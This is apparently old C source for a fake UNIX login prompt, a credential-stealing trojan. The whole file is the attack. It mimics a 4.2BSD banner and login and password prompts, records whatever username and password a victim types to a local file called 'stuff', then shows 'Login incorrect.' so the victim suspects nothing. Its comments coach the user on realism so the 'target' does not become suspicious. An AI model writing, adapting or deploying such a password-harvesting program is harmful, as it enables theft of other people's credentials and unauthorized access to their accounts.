/* this is what a 'C' comment looks like.  You can leave them out. */

/* define's are like macros you can use for configuration. */

#define SYSTEM "\n\nTiburon Systems 4.2bsd UNIX (shark)\n\n"

/* The above string should be made to look like the message that your
 *  * system prints when ready.  Each \n represents a carriage return.
 *   */

#define LOGIN  "login: "

/* The above is the login prompt.  You shouldn't have to change it
 *  * unless you're running some strange version of UNIX.
 *   */

#define PASSWORD "password:"

/* The above is the password prompt.  You shouldn't have to change
 *  * it, either.
 *   */

#define WAIT 2

/* The numerical value assigned to WAIT is the delay you get after
 *  * "password:" and before "login incorrect."  Change it (0 = almost
 *   * no delay, 5 = LONG delay) so it looks like your system's delay.
 *    * realism is the key here - we don't want our target to become
 *     * suspicious.
 *      */


#define INCORRECT "Login incorrect.\n"

/* Change the above so it is what your system says when an incorrect
 *  * login is given.  You shouldn't have to change it.
 *   */

#define FILENAME "stuff"

/* FILENAME is the name of the file that the hacked passwords will
 *  * be put into automatically.  'stuff' is a perfectly good name.
 *   */

/* Don't change the rest of the program unless there is a need to
 *  * and you know 'C'.
 *   */

#include <curses.h>
#include <signal.h>
int stop();

main()
{
char name[10], password[10];
int i;
FILE *fp, *fopen();
signal(SIGINT,stop);
initscr();
printf(SYSTEM);
printf(LOGIN);
scanf("%[^\n]",name);
getchar();
noecho();
printf(PASSWORD);
scanf("%[^\n]",password);
printf("\n");
getchar();
echo();
sleep(WAIT);


if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
fprintf(fp,"login %s has password %s\n",name,password);
fclose(fp);
}

printf(INCORRECT);
endwin();
}

stop()
{
endwin();
exit(0);
}
